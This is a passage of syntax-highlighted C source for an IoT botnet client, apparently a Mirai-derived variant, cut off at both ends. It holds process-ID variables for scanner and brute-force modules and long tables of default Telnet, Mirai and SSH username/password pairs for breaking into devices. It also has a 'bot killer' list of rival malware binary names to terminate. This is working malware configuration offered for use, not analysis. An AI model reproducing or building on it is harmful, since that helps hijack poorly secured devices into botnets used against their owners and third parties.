tTimeout;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">short</span> bufUsed;</span><br><span class="line">        <span class="keyword">char</span> *sockbuf;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">initConnection</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">makeRandomStr</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> length)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sockprintf</span><span class="params">(<span class="keyword">int</span> sock, <span class="keyword">char</span> *formatStr, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">inet_ntoa</span><span class="params">(struct in_addr in)</span></span>;</span><br><span class="line"><span class="keyword">int</span> mainCommSock = <span class="number">0</span>, currentServer = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> *pids;</span><br><span class="line"><span class="keyword">uint32_t</span> scanPid;</span><br><span class="line"><span class="keyword">uint32_t</span> bcmPid;</span><br><span class="line"><span class="keyword">uint32_t</span> testmiraiPid;</span><br><span class="line"><span class="keyword">uint32_t</span> testtelnetPid;</span><br><span class="line"><span class="keyword">uint32_t</span> scanPid;</span><br><span class="line"><span class="keyword">uint32_t</span> miraiPid;</span><br><span class="line"><span class="keyword">uint32_t</span> Phonepid;</span><br><span class="line"><span class="keyword">uint64_t</span> numpids = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">ourIP</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> macAddress[<span class="number">6</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">// CONFIG</span></span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span>* phone[] = &#123;<span class="string">&quot;:&quot;</span>, <span class="string">&quot;ogin&quot;</span>, <span class="string">&quot;sername&quot;</span>, <span class="string">&quot;assword&quot;</span>, <span class="string">&quot;Linux&quot;</span>, <span class="string">&quot;9615-cdp&quot;</span>, (<span class="keyword">char</span>*)<span class="number">0</span>&#125;;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> *Telnet_Usernames[] = &#123;</span><br><span class="line">	<span class="string">&quot;telnet\0&quot;</span>, <span class="comment">//telnet:telnet</span></span><br><span class="line">	<span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:</span></span><br><span class="line">	<span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:1234</span></span><br><span class="line">	<span class="string">&quot;admin\0&quot;</span>, <span class="comment">//admin:admin</span></span><br><span class="line">    <span class="string">&quot;admin\0&quot;</span>, <span class="comment">//admin:</span></span><br><span class="line">	<span class="string">&quot;admin\0&quot;</span>, <span class="comment">//admin:password</span></span><br><span class="line">	<span class="string">&quot;user\0&quot;</span>, <span class="comment">//user:user</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> *Telnet_Passwords[] = &#123;</span><br><span class="line">	<span class="string">&quot;telnet\0&quot;</span>, <span class="comment">//telnet:telnet</span></span><br><span class="line">	<span class="string">&quot;\0&quot;</span>, <span class="comment">//root:</span></span><br><span class="line">	<span class="string">&quot;1234\0&quot;</span>, <span class="comment">//root:1234</span></span><br><span class="line">	<span class="string">&quot;admin\0&quot;</span>, <span class="comment">//admin:admin</span></span><br><span class="line">	<span class="string">&quot;\0&quot;</span>, <span class="comment">//admin:</span></span><br><span class="line">	<span class="string">&quot;password\0&quot;</span>, <span class="comment">//admin:</span></span><br><span class="line">	<span class="string">&quot;user\0&quot;</span>, <span class="comment">//user:user</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> *Mirai_Usernames[] = &#123;</span><br><span class="line"><span class="string">&quot;telnet\0&quot;</span>, <span class="comment">//mother:fucker</span></span><br><span class="line"><span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:xc3511</span></span><br><span class="line"><span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:vizxv</span></span><br><span class="line"><span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:admin</span></span><br><span class="line"><span class="string">&quot;admin\0&quot;</span>, <span class="comment">//admin:admin</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:888888</span></span><br><span class="line"><span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:xmhdipc</span></span><br><span class="line"><span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:default</span></span><br><span class="line"><span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:juantech</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:123456</span></span><br><span class="line"><span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:54321</span></span><br><span class="line"><span class="string">&quot;support\0&quot;</span>, <span class="comment">//support:support</span></span><br><span class="line"><span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:(none)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;admin\0&quot;</span>, <span class="comment">//admin:password</span></span><br><span class="line"><span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:root</span></span><br><span class="line"><span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:12345</span></span><br><span class="line"><span class="string">&quot;user\0&quot;</span>, <span class="comment">//user:user</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;admin\0&quot;</span>, <span class="comment">//admin:(none)</span></span><br><span class="line"><span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:pass</span></span><br><span class="line"><span class="string">&quot;admin\0&quot;</span>, <span class="comment">//admin:admin1234</span></span><br><span class="line"><span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:1111</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;admin\0&quot;</span>, <span class="comment">//admin:smcadmin</span></span><br><span class="line"><span class="string">&quot;admin\0&quot;</span>, <span class="comment">//admin:1111</span></span><br><span class="line"><span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:666666</span></span><br><span class="line"><span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:password</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:1234</span></span><br><span class="line"><span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:klv123</span></span><br><span class="line"><span class="string">&quot;Administrator\0&quot;</span>, <span class="comment">//Administrator:admin</span></span><br><span class="line"><span class="string">&quot;service\0&quot;</span>, <span class="comment">//service:service</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;supervisor\0&quot;</span>, <span class="comment">//supervisor:supervisor</span></span><br><span class="line"><span class="string">&quot;guest\0&quot;</span>, <span class="comment">//guest:guest</span></span><br><span class="line"><span class="string">&quot;guest\0&quot;</span>, <span class="comment">//guest:12345</span></span><br><span class="line"><span class="string">&quot;guest\0&quot;</span>, <span class="comment">//guest:12345</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;admin1\0&quot;</span>, <span class="comment">//admin1:password</span></span><br><span class="line"><span class="string">&quot;administrator\0&quot;</span>, <span class="comment">//administrator:1234</span></span><br><span class="line"><span class="string">&quot;666666\0&quot;</span>, <span class="comment">//666666:666666</span></span><br><span class="line"><span class="string">&quot;888888\0&quot;</span>, <span class="comment">//888888:888888</span></span><br><span class="line"><span class="string">&quot;ubnt\0&quot;</span>, <span class="comment">//ubnt:ubnt</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;klv1234\0&quot;</span>, <span class="comment">//root:klv1234</span></span><br><span class="line"><span class="string">&quot;Zte521\0&quot;</span>, <span class="comment">//root:Zte521</span></span><br><span class="line"><span class="string">&quot;hi3518\0&quot;</span>, <span class="comment">//root:hi3518</span></span><br><span class="line"><span class="string">&quot;jvbzd\0&quot;</span>, <span class="comment">//root:jvbzd</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;anko\0&quot;</span>, <span class="comment">//root:anko</span></span><br><span class="line"><span class="string">&quot;zlxx\0&quot;</span>, <span class="comment">//root:zlxx</span></span><br><span class="line"><span class="string">&quot;7ujMko0vizxv\0&quot;</span>, <span class="comment">//root:7ujMko0vizxv</span></span><br><span class="line"><span class="string">&quot;7ujMko0admin\0&quot;</span>, <span class="comment">//root:7ujMko0admin</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;system\0&quot;</span>, <span class="comment">//root:system</span></span><br><span class="line"><span class="string">&quot;ikwb\0&quot;</span>, <span class="comment">//root:ikwb</span></span><br><span class="line"><span class="string">&quot;dreambox\0&quot;</span>, <span class="comment">//root:dreambox</span></span><br><span class="line"><span class="string">&quot;user\0&quot;</span>, <span class="comment">//root:user</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;realtek\0&quot;</span>, <span class="comment">//root:realtek</span></span><br><span class="line"><span class="string">&quot;00000000\0&quot;</span>, <span class="comment">//root:00000000</span></span><br><span class="line"><span class="string">&quot;1111111\0&quot;</span>, <span class="comment">//admin:1111111</span></span><br><span class="line"><span class="string">&quot;1234\0&quot;</span>, <span class="comment">//admin:1234</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;12345\0&quot;</span>, <span class="comment">//admin:12345</span></span><br><span class="line"><span class="string">&quot;54321\0&quot;</span>, <span class="comment">//admin:54321</span></span><br><span class="line"><span class="string">&quot;123456\0&quot;</span>, <span class="comment">//admin:123456</span></span><br><span class="line"><span class="string">&quot;7ujMko0admin\0&quot;</span>, <span class="comment">//admin:7ujMko0admin</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;1234\0&quot;</span>, <span class="comment">//admin:1234</span></span><br><span class="line"><span class="string">&quot;pass\0&quot;</span>, <span class="comment">//admin:pass</span></span><br><span class="line"><span class="string">&quot;meinsm\0&quot;</span>, <span class="comment">//admin:meinsm</span></span><br><span class="line"><span class="string">&quot;tech\0&quot;</span>, <span class="comment">//tech:tech</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;fucker\0&quot;</span>, <span class="comment">//mother:fucker</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> *Mirai_Passwords[] = &#123;</span><br><span class="line"><span class="string">&quot;telnet\0&quot;</span>, <span class="comment">//mother:fucker</span></span><br><span class="line"><span class="string">&quot;xc3511\0&quot;</span>, <span class="comment">//root:xc3511</span></span><br><span class="line"><span class="string">&quot;vizxv\0&quot;</span>, <span class="comment">//root:vizxv</span></span><br><span class="line"><span class="string">&quot;admin\0&quot;</span>, <span class="comment">//root:admin</span></span><br><span class="line"><span class="string">&quot;admin\0&quot;</span>, <span class="comment">//admin:admin</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;888888\0&quot;</span>, <span class="comment">//root:888888</span></span><br><span class="line"><span class="string">&quot;xmhdipc\0&quot;</span>, <span class="comment">//root:xmhdipc</span></span><br><span class="line"><span class="string">&quot;default\0&quot;</span>, <span class="comment">//root:default</span></span><br><span class="line"><span class="string">&quot;juantech\0&quot;</span>, <span class="comment">//root:juantech</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;123456\0&quot;</span>, <span class="comment">//root:123456</span></span><br><span class="line"><span class="string">&quot;54321\0&quot;</span>, <span class="comment">//root:54321</span></span><br><span class="line"><span class="string">&quot;support\0&quot;</span>, <span class="comment">//support:support</span></span><br><span class="line"><span class="string">&quot;\0&quot;</span>, <span class="comment">//root:(none)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;password\0&quot;</span>, <span class="comment">//admin:password</span></span><br><span class="line"><span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:root</span></span><br><span class="line"><span class="string">&quot;12345\0&quot;</span>, <span class="comment">//root:12345</span></span><br><span class="line"><span class="string">&quot;user\0&quot;</span>, <span class="comment">//user:user</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\0&quot;</span>, <span class="comment">//admin:(none)</span></span><br><span class="line"><span class="string">&quot;pass\0&quot;</span>, <span class="comment">//root:pass</span></span><br><span class="line"><span class="string">&quot;admin1234\0&quot;</span>, <span class="comment">//admin:admin1234</span></span><br><span class="line"><span class="string">&quot;1111\0&quot;</span>, <span class="comment">//root:1111</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;smcadmin\0&quot;</span>, <span class="comment">//admin:smcadmin</span></span><br><span class="line"><span class="string">&quot;1111\0&quot;</span>, <span class="comment">//admin:1111</span></span><br><span class="line"><span class="string">&quot;666666\0&quot;</span>, <span class="comment">//root:666666</span></span><br><span class="line"><span class="string">&quot;password\0&quot;</span>, <span class="comment">//root:password</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;1234\0&quot;</span>, <span class="comment">//root:1234</span></span><br><span class="line"><span class="string">&quot;klv123\0&quot;</span>, <span class="comment">//root:klv123</span></span><br><span class="line"><span class="string">&quot;admin\0&quot;</span>, <span class="comment">//Administrator:admin</span></span><br><span class="line"><span class="string">&quot;service\0&quot;</span>, <span class="comment">//service:service</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;supervisor\0&quot;</span>, <span class="comment">//supervisor:supervisor</span></span><br><span class="line"><span class="string">&quot;guest\0&quot;</span>, <span class="comment">//guest:guest</span></span><br><span class="line"><span class="string">&quot;12345\0&quot;</span>, <span class="comment">//guest:12345</span></span><br><span class="line"><span class="string">&quot;12345\0&quot;</span>, <span class="comment">//guest:12345</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;password\0&quot;</span>, <span class="comment">//admin1:password</span></span><br><span class="line"><span class="string">&quot;1234\0&quot;</span>, <span class="comment">//administrator:1234</span></span><br><span class="line"><span class="string">&quot;666666\0&quot;</span>, <span class="comment">//666666:666666</span></span><br><span class="line"><span class="string">&quot;888888\0&quot;</span>, <span class="comment">//888888:888888</span></span><br><span class="line"><span class="string">&quot;ubnt\0&quot;</span>, <span class="comment">//ubnt:ubnt</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;klv1234\0&quot;</span>, <span class="comment">//root:klv1234</span></span><br><span class="line"><span class="string">&quot;Zte521\0&quot;</span>, <span class="comment">//root:Zte521</span></span><br><span class="line"><span class="string">&quot;hi3518\0&quot;</span>, <span class="comment">//root:hi3518</span></span><br><span class="line"><span class="string">&quot;jvbzd\0&quot;</span>, <span class="comment">//root:jvbzd</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;anko\0&quot;</span>, <span class="comment">//root:anko</span></span><br><span class="line"><span class="string">&quot;zlxx\0&quot;</span>, <span class="comment">//root:zlxx</span></span><br><span class="line"><span class="string">&quot;7ujMko0vizxv\0&quot;</span>, <span class="comment">//root:7ujMko0vizxv</span></span><br><span class="line"><span class="string">&quot;7ujMko0admin\0&quot;</span>, <span class="comment">//root:7ujMko0admin</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;system\0&quot;</span>, <span class="comment">//root:system</span></span><br><span class="line"><span class="string">&quot;ikwb\0&quot;</span>, <span class="comment">//root:ikwb</span></span><br><span class="line"><span class="string">&quot;dreambox\0&quot;</span>, <span class="comment">//root:dreambox</span></span><br><span class="line"><span class="string">&quot;user\0&quot;</span>, <span class="comment">//root:user</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;realtek\0&quot;</span>, <span class="comment">//root:realtek</span></span><br><span class="line"><span class="string">&quot;00000000\0&quot;</span>, <span class="comment">//root:00000000</span></span><br><span class="line"><span class="string">&quot;1111111\0&quot;</span>, <span class="comment">//admin:1111111</span></span><br><span class="line"><span class="string">&quot;1234\0&quot;</span>, <span class="comment">//admin:1234</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;12345\0&quot;</span>, <span class="comment">//admin:12345</span></span><br><span class="line"><span class="string">&quot;54321\0&quot;</span>, <span class="comment">//admin:54321</span></span><br><span class="line"><span class="string">&quot;123456\0&quot;</span>, <span class="comment">//admin:123456</span></span><br><span class="line"><span class="string">&quot;7ujMko0admin\0&quot;</span>, <span class="comment">//admin:7ujMko0admin</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;1234\0&quot;</span>, <span class="comment">//admin:1234</span></span><br><span class="line"><span class="string">&quot;pass\0&quot;</span>, <span class="comment">//admin:pass</span></span><br><span class="line"><span class="string">&quot;meinsm\0&quot;</span>, <span class="comment">//admin:meinsm</span></span><br><span class="line"><span class="string">&quot;tech\0&quot;</span>, <span class="comment">//tech:tech</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;fucker\0&quot;</span>, <span class="comment">//mother:fucker</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> *SSH_Usernames[] = &#123;</span><br><span class="line">	<span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:root</span></span><br><span class="line">	<span class="string">&quot;admin\0&quot;</span>, <span class="comment">//admin:admin</span></span><br><span class="line">	<span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:admin</span></span><br><span class="line">	<span class="string">&quot;admin\0&quot;</span>, <span class="comment">//admin:1234</span></span><br><span class="line">	<span class="string">&quot;ubnt\0&quot;</span>, <span class="comment">//ubnt:ubnt</span></span><br><span class="line">	<span class="string">&quot;user\0&quot;</span>, <span class="comment">//user:user</span></span><br><span class="line">	<span class="string">&quot;ususario\0&quot;</span>, <span class="comment">//usuario:ususario</span></span><br><span class="line">	<span class="string">&quot;telnet\0&quot;</span>, <span class="comment">//telnet:telnet</span></span><br><span class="line">	<span class="string">&quot;support\0&quot;</span>, <span class="comment">//support:support</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> *SSH_Passwords[] = &#123;</span><br><span class="line">	<span class="string">&quot;root\0&quot;</span>, <span class="comment">//root:root</span></span><br><span class="line">	<span class="string">&quot;admin\0&quot;</span>, <span class="comment">//admin:admin</span></span><br><span class="line">	<span class="string">&quot;admin\0&quot;</span>, <span class="comment">//root:admin</span></span><br><span class="line">	<span class="string">&quot;1234\0&quot;</span>, <span class="comment">//admin:1234</span></span><br><span class="line">	<span class="string">&quot;ubnt\0&quot;</span>, <span class="comment">//ubnt:ubnt</span></span><br><span class="line">	<span class="string">&quot;user\0&quot;</span>, <span class="comment">//user:user</span></span><br><span class="line">	<span class="string">&quot;ususario\0&quot;</span>, <span class="comment">//usuario:ususario</span></span><br><span class="line">	<span class="string">&quot;telnet\0&quot;</span>, <span class="comment">//telnet:telnet</span></span><br><span class="line">	<span class="string">&quot;support\0&quot;</span>, <span class="comment">//support:support</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> *Bot_Killer_Binarys[] = &#123;</span><br><span class="line">	<span class="string">&quot;amsjkfbns&quot;</span>,</span><br><span class="line">	<span class="string">&quot;mips&quot;</span>,</span><br><span class="line">	<span class="string">&quot;xdf.mips&quot;</span>,</span><br><span class="line">	<span class="string">&quot;xdf.*&quot;</span>,</span><br><span class="line">	<span class="string">&quot;xdf*&quot;</span>,</span><br><span class="line">	<span class="string">&quot;xdf.mipsel&quot;</span>,</span><br><span class="line">	<span class="string">&quot;xdf.x86_64&quot;</span>,</span><br><span class="line">	<span class="string">&quot;xdf.arm7&quot;</span>,</span><br><span class="line">	<span class="string">&quot;xdf.ppc&quot;</span>,</span><br><span class="line">	<span class="string">&quot;xdf.sh4&quot;</span>,</span><br><span class="line">	<span class="string">&quot;mipsel&quot;</span>, </span><br><span class="line">	<span class="string">&quot;sh4&quot;</span>, </span><br><span class="line">	<span class="string">&quot;x86&quot;</span>,</span><br><span class="line">	<span class="string">&quot;i686&quot;</span>,</span><br><span class="line">	<span class="string">&quot;ppc&quot;</span>,</span><br><span class="line">	<span class="string">&quot;i586&quot;</span>,</span><br><span class="line">	<span class="string">&quot;jack*&quot;</span>,</span><br><span class="line">	<span class="string">&quot;hack*&quot;</span>,</span><br><span class="line">	<span class="string">&quot;arm*&quot;</span></span><br><span class="line">	<span class="string">&quot;tel*&quot;</span></span><br><span class="line">	<span class="string">&quot;b1&quot;</span>,</span><br><span class="line">	<span class="string">&quot;b2&quot;</span>,</span><br><span class="line">	<span class="string">&quot;b3&quot;</span>,</span><br><span class="line">	<span class="string">&quot;b4&quot;</span>,</span><br><span class="line">	<span class="string">&quot;b5&quot;</span>,</span><br><span class="line">	<span class="string">&quot;b6&quot;</span>,</span><br><span class="line">	<span class="string">&quot;b7&quot;</span>,</span><br><span class="line">	<span class="string">&quot;b8&quot;</span>,</span><br><span class="line">	<span class="string">&quot;b9&quot;</span>,</span><br><span class="line">	<span class="string">&quot;wget&quot;</span>,</span><br><span class="line">	<span class="string">&quot;orion&quot;</span>,</span><br><span class="line">	<span class="string">&quot;lol*&quot;</span>,</span><br><span class="line">	<span class="string">&quot;busybox*&quot;</span>,</span><br><span class="line">	<span class="string">&quot;badbox*&quot;</span>,</span><br><span class="line">	<span class="string">&quot;DFhxdhdf&quot;</span>,</span><br><span class="line">	<span class="string">&quot;dvrHelper&quot;</span>,</span><br><span class="line">	<span class="string">&quot;FDFDHFC&quot;</span>,</span><br><span class="line">	<span class="string">&quot;FEUB&quot;</span>,</span><br><span class="line">	<span class="string">&quot;FTUdftui&quot;</span>,</span><br><span class="line">	<span class="string">&quot;GHfjfgvj&quot;</span>,</span><br><span class="line">	<span class="string">&quot;jhUOH&quot;</span>,</span><br><span class="line">	<span class="string">&quot;JIPJIPJj&quot;</span>,</span><br><span class="line">	<span class="string">&quot;JIPJuipjh&quot;</span>,</span><br><span class="line">	<span class="string">&quot;kmyx86_64&quot;</span>,</span><br><span class="line">	<span class="string">&quot;lolmipsel&quot;</span>,</span><br><span class="line">	<span class="string">&quot;mips&quot;</span>,</span><br><span class="line">	<span class="string">&quot;mipsel&quot;</span>,</span><br><span class="line">	<span class="string">&quot;RYrydry&quot;</span>,</span><br><span class="line">	<span class="string">&quot;TwoFace*&quot;</span>,</span><br><span class="line">	<span class="string">&quot;UYyuyioy&quot;</span>,</span><br><span class="line">	<span class="string">&quot;x86_64&quot;</span>,</span><br><span class="line">	<span class="string">&quot;XDzdfxzf&quot;</span>,</span><br><span class="line">	<span class="string">&quot;xx*&quot;</span>,</span><br><span class="line">	<span class="string">&quot;sh&quot;</span>,</span><br><span class="line">	<span class="string">&quot;1&quot;</span>,</span><br><span class="line">	<span class="string">&quot;2&quot;</span>,</span><br><span class="line">	<span class="string">&quot;3&quot;</span>,</span><br><span class="line">	<span class="string">&quot;4&quot;</span>,</span><br><span class="line">	<span class="string">&quot;5&quot;</span>,</span><br><span class="line">	<span class="string">&quot;6&quot;</span>,</span><br><span class="line">	<span class="string">&quot;7&quot;</span>,</span><br><span class="line">	<span class="string">&quot;8&quot;</span>,</span><br><span class="line">	<span class="string">&quot;9&quot;</span>,</span><br><span class="line">	<span class="string">&quot;10&quot;</span>,</span><br><span class="line">	<span class="string">&quot;11&quot;</span>,</span><br><span class="line">	<span class="string">&quot;12&quot;</span>,</span><br><span class="line">	<span class="string">&quot;13&quot;</span>,</span><br><span class="line">	<span class="string">&quot;14&quot;</span>,</span><br><span class="line">	<span class="string">&quot;15&quot;</span>,</span><br><span class="line">	<span class="string">&quot;16&quot;</span>,</span><br><span class="line">	<span class="string">&quot;17&quot;</span>,</span><br><span class="line">	<span class="string">&quot;18&quot;</span>,</span><br><span class="line">	<span class="string">&quot;19&quot;</span>,</span><br><span class="line">	<span class="string">&quot;20&quot;</span>, </span><br><span class="line">	<span class="string">&quot;busybox&quot;</span>,</span><br><span class="line">	<span class="string">&quot;badbox&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Mirai*&quot;</span>,</span><br><span class="line">	<span class="string">&quot;mirai*&quot;</span>,</span><br><span class="line">	<span class="string">&quot;cunty*&quot;</span></span><br><span class="line">	<span class="string">&quot;IoT*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mips&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mips64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mipsel&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sh2eb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sh2elf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sh4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;x86&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;armv5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;armv4tl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;armv4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;armv6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;i686&quot;</span>,</span><br><span class="line">    <span class="string">&quot;powerpc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;powerpc440fp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;i586&quot;</span>,</span><br><span class="line">    <span class="string">&quot;m68k&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sparc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;x86_64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jackmymips&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jackmymips64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jackmymipsel&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jackmysh2eb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jackmysh2elf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jackmysh4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jackmyx86&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jackmyarmv5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jackmyarmv4tl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jackmyarmv4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jackmyarmv6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jackmyi686&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jackmypowerpc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jackmypowerpc440fp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jackmyi586&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jackmym68k&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jackmysparc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jackmyx86_64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hackmymips&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hackmymips64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hackmymipsel&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hackmysh2eb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hackmysh2elf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hackmysh4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hackmyx86&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hackmyarmv5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hackmyarmv4tl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hackmyarmv4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hackmyarmv6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hackmyi686&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hackmypowerpc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hackmypowerpc440fp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hackmyi586&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hackmym68k&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hackmysparc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hackmyx86_64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b10&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b12&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b13&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b14&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b15&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b16&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b17&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b18&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b19&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b20&quot;</span>,</span><br><span class="line">    <span class="string">&quot;busyboxterrorist&quot;</span>,</span><br><span class="line">    <span class="string">&quot;DFhxdhdf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dvrHelper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;FDFDHFC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;FEUB&quot;</span>,</span><br><span class="line">    <span class="string">&quot;FTUdftui&quot;</span>,</span><br><span class="line">    <span class="string">&quot;GHfjfgvj&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jhUOH&quot;</span>,</span><br><span class="line">    <span class="string">&quot;JIPJIPJj&quot;</span>,</span><br><span class="line">    <span class="string">&quot;JIPJuipjh&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kmymips&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kmymips64&quot;</span>,</span><br><span class="line">    <span 